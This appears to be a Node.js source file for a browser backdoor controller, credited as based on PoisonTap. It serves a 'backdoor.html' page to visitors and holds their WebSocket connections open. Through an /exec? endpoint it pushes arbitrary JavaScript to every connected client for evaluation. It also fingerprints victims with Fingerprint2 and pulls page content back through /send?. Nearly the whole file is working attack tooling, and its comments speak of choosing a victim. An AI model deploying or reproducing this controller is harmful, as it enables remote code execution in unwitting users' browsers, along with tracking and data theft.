// CREDITS
// based on PoisonTap by Samy Kamkar

//var _ = require('underscore')
var WebSocketServer = require('websocket').server
var webSocketsServerPort = 1337
var fs = require('fs');
var inquirer = require('inquirer');
var backdoorHtml = fs.readFileSync(__dirname + '/backdoor.html');
var http = require('http')
var conns = []
var gr
var server = http.createServer((request, response) => {

  //console.log((new Date()) + ' HTTP server. URL ' + request.url + ' requested.')

  if (request.url.indexOf('/exec?') === 0)
  {
    response.writeHead(404, {'Content-Type': 'text/html'})
    for (var i in conns)
      conns[i].sendUTF(JSON.stringify({ request: 'eval', content: request.url.substr(6) }))
    response.end("sent")
  }
  else if (request.url.indexOf('/send?') === 0)
  {
    response.writeHead(404, {'Content-Type': 'text/html'})
    for (var i in conns)
      conns[i].sendUTF('{"' + decodeURI(request.url.substr(6)).replace(/"/g, '\\"').replace(/&/g, '","').replace(/=/g,'":"') + '"}')
    var checkgr = () =>
    {
      if (gr)
      {
        response.end(gr)
        gr = ""
      }
      else
        setTimeout(checkgr, 500)
    }
    checkgr()
  }
  else if (request.url === '/status')
  {
    response.writeHead(200, {'Content-Type': 'application/json'})
    var responseObject = {
      currentClients: 1234,
      totalHistory: 567
    }
    response.end(JSON.stringify(responseObject))
  }
  else {
	response.writeHead(200, {'Content-Type': 'text/html'});
	response.write(backdoorHtml);
	response.end();
    //response.writeHead(404, {'Content-Tddype': 'text/html'})
    //response.end('Sorry, unknown url')
  }
})
server.listen(webSocketsServerPort, () => {
  console.log((new Date()) + " Server is listening on port " + webSocketsServerPort)
})

// create the server
wsServer = new WebSocketServer({
  httpServer: server
})
function handleresponse(obj, con)
{
	//HERE WHAT TO DO WITH RESPONSES FROM CLIENTS
	if ("fingerprint" in obj) {
		console.log(obj.fingerprint);
	}
	// TODO use for merging with connections for info // if ("components" in obj) {

}
function handleReq(obj, con)
{
  if (obj.request === 'getresponse')
    gr = obj.html
}

function ask_fingerprint_info(connection)
{
	command = "new Fingerprint2().get(function(result, components){ socket.send(JSON.stringify({'fingerprint':result})); socket.send(JSON.stringify({'components':components})); });"
	connection.sendUTF(JSON.stringify({ request: 'eval', content: command }))  
}

wsServer.on('request', (request) => {
  var obj
  var connection = request.accept(null, request.origin)
  conns.push(connection)

  connection.on('request', (message) => {
    console.log('request: ' + message)
  })

  connection.on('message', (message) => {
    try { obj = JSON.parse(message.utf8Data) } catch(e) {}
    if (typeof(obj) === 'object')
	  {
		handleReq(obj, connection);
		handleresponse(obj,connection);
	  }
    else
	  {
		//TODO give name of connection (with using the connection var to the left
		console.log('message: ' + message.utf8Data);
	  }

  })

  // remove connection from our list
  connection.on('close', connection => {
    console.log('connection closed')
    for (var i in conns)
      if (conns[i] == connection)
      //if (_.isEqual(conns[i], connection)) // XXX
        conns.splice(i, 1)
  })

  ask_fingerprint_info(connection);
})

//START interface
var stdin = process.openStdin();
//TODO list help en start here (make function to be recalled)
console.log("");
console.log("Typed javascript-commands will be sent to all connected clients");

/*
stdin.addListener("data", function(d) {
	var command = d.toString().trim();
	//TODO TEMP SEND TO ALL -> later make layers and choose victim (not like this)
	for (var i in conns)
		conns[i].sendUTF(JSON.stringify({ request: 'eval', content: command }))
	console.log("COMMAND SENT: "+command);
});
*/

/*
inquirer([{name: 'command', message: '>>>'}], function(answers){

	 console.log(answers); //an object containing the user response.

});
*/
/*
function input() {
	inquirer.prompt([{name: 'command', message: '>>>'}]).then(answers => {
		 console.log(answers); //an object containing the user response.
		//repeat
		input();
	});
}
*/
var prompt = require('prompt');
prompt.message = "";
prompt.delimiter = "";

 var colors = require("colors/safe");

// Start the prompt
prompt.start();

//
// Get two properties from the user: username and email
//
prompt.get({properties: {command:{description: ">>>"}}}, function (err, result) {
  console.log('command: ' + result.command);
});
